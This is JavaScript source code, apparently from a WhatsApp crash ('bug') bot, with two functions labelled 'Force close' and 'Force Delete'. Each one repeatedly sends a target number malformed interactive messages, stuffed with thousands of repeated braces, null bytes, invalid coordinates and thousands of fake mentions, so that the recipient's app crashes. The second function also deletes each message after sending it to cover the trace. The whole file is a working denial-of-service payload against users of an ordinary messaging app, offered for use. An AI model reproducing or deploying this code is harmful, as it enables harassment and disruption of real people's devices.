/// Force close ( gtw masih work apa kga )
async function EmpireUltimate(target) {
  for (let i = 0; i < 15; i++) {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                hasMediaAttachment: false,
                liveLocationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.9999,
                  name: "Matrix",
                  address: "Matrix"
                }
              },
              body: {
                text: "( 👾 ) AcistàMatr¡x505¿"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(999)
                  },
                  {
					name: "payment_status",
					buttonParamsJson: "\u0003"
			    },
                ]
              },
              contextInfo: {
                remoteJid: "status@broadcast",
                participant: target,
                forwardingScore: 250208,
                isForwarded: false,
                mentionedJid: [target, "13135550002@s.whatsapp.net"]
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              }
            }
          }
        }
      },
      {}
    );

    await Empire.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
console.log("EtteckTic Force")
  }
}


//// Force Delete

async function DelateForceEmpire(target) {
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

  for (let i = 0; i < 15; i++) {
    const messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: ""
            },
            footer: {
              text: " Acistà-Matr¡x 🕷️⃟𖤐"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(9999),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "mpm", buttonParamsJson: "{}" },
                { name: "mpm", buttonParamsJson: "\u0003" },
                { name: "call_permission_request", buttonParamsJson: "{}" }
              ]
            },
            contextInfo: {
              mentionedJid: [
                jid,
                "0@s.whatsapp.net",
                ...Array.from({ length: 9000 }, () =>
                  "1" + Math.floor(Math.random() * 250208) + "@s.whatsapp.net"
                )
              ]
            }
          }
        }
      }
    }), {
      userJid: target,
      timestamp: Math.floor(Date.now() / 1000)
    })

    messageContent.messageTimestamp = Math.floor(Date.now() / 1000)

    await sock.relayMessage(target, messageContent.message, {
      participant: { jid: target },
      messageId: messageContent.key.id
    })

    await sleep(4000)

    await sock.sendMessage(target, { delete: messageContent.key })
  }
}